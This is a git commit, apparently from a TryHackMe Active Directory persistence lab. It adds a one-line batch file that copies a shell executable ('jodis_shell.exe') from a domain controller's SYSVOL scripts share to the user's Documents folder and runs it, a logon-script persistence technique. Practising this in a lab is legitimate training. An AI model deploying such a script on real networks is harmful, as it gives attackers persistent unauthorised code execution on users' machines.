6f1843359366c18c404d6f2f4e345fbc06afa2f3
JodisKripe <jodis@kali>
2023-04-09 15:29:20 +0530

    Persisting AD Done

---
+++ PersistingAD/jodis.bat
@@ -0,0 +1,1 @@
+echo hi >> C:\Users\%USERNAME%\Documents\hola.txt  && copy \\thmdc.za.tryhackme.loc\sysvol\za.tryhackme.loc\scripts\jodis_shell.exe C:\Users\%USERNAME%\Documents\jodis_shell.exe && timeout /t 20 && C:\Users\%USERNAME%\Documents\jodis_shell.exe
